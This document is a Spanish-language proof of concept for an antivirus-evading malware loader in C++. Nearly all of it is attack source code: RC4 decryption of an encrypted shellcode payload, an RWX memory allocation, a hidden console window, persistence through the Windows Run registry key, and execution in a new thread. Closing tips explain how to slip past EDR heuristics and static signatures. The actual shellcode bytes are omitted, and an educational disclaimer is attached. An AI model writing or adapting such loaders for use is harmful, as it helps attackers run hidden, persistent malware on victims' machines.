# Investigación: Evasión de Antivirus mediante Loaders en C++

## 📋 Descripción Técnica
Este proyecto es una prueba de concepto (PoC) sobre cómo los loaders de malware moderno evaden la detección estática utilizando cifrado **RC4** y asignación dinámica de memoria.

**Técnicas demostradas:**
* **Ofuscación:** El payload se almacena cifrado (RC4) para evitar firmas estáticas.
* **Gestión de Memoria:** Uso de `VirtualAlloc` y `RtlMoveMemory` para inyección.
* **Persistencia:** Manipulación del registro de Windows (`RegOpenKey`, `RegSetValueEx`).

---

## 💻 Código de la Prueba de Concepto (Loader C++)

El siguiente código demuestra la rutina de descifrado y ejecución en memoria.

```cpp
#include <windows.h>
#include <iostream>

// Clave de cifrado simétrico
char key[] = "MiClaveSecreta123";

// Payload Shellcode (Cifrado con RC4 para evadir detección estática)
unsigned char encrypted_payload[] = {
    // 0xFC, 0xE8, 0x82, ... (Shellcode real omitido por seguridad)
};

// Algoritmo RC4 (Rivest Cipher 4) para descifrado en tiempo de ejecución
void rc4_decrypt(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
    unsigned char j = 0;
    unsigned char s[256];
    unsigned char temp;

    // Inicialización del vector de estado (KSA)
    for (int i = 0; i < 256; ++i) {
        s[i] = i;
    }
    
    for (int i = 0; i < 256; ++i) {
        j = (j + s[i] + key[i % key_len]) % 256;
        // Swap simple
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }

    // Generación de flujo de cifrado (PRGA) y XOR
    int i = 0;
    j = 0;
    for (int k = 0; k < data_len; ++k) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        
        temp = s[i];
        s[i] = s[j];
        s[j] = temp;

        data[k] = data[k] ^ s[(s[i] + s[j]) % 256];
    }
}

// Rutina de Inyección en Memoria
DWORD_PTR execute_payload() {
    // 1. Asignar memoria con permisos de Ejecución/Lectura/Escritura (RWX)
    // Nota: En un escenario real, es preferible evitar RWX para no alertar heurísticas.
    LPVOID payload_address = VirtualAlloc(NULL, sizeof(encrypted_payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 2. Mover el payload cifrado a la memoria reservada
    RtlMoveMemory(payload_address, encrypted_payload, sizeof(encrypted_payload));
    
    // 3. Descifrar el payload en memoria (In-Memory Decryption)
    rc4_decrypt((unsigned char*)payload_address, sizeof(encrypted_payload), key, strlen(key));

    return (DWORD_PTR)payload_address;
}

int main() {
    // Ocultar la ventana de consola para ejecución sigilosa
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // --- Módulo de Persistencia (Registro de Windows) ---
    HKEY hKey;
    const char* czExePath = "C:\\Ruta\\Al\\Payload.exe"; // Simulado
    
    // Abrir clave de registro 'Run'
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        // Establecer valor para ejecución al inicio
        RegSetValueEx(hKey, "MyLoader", 0, REG_SZ, (const BYTE*)czExePath, strlen(czExePath) + 1);
        RegCloseKey(hKey);
    }
    
    // --- Ejecución ---
    LPVOID address = (LPVOID)execute_payload();
    
    // Crear hilo de ejecución para el shellcode
    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, NULL);
    WaitForSingleObject(th, INFINITE);

    return 0;
}

⚠️ Consideraciones de Seguridad
VirtualAlloc RWX: El uso de PAGE_EXECUTE_READWRITE es una bandera roja para los EDR modernos. Se recomienda usar VirtualProtect para cambiar permisos de RW a RX después de escribir.

Firma: Aunque RC4 oculta el payload, el binario compilado (el loader) debe ser ofuscado para evitar firmas de la estructura del código.

Disclaimer: Este código se proporciona únicamente con fines educativos y de investigación en ciberseguridad defensiva.
 
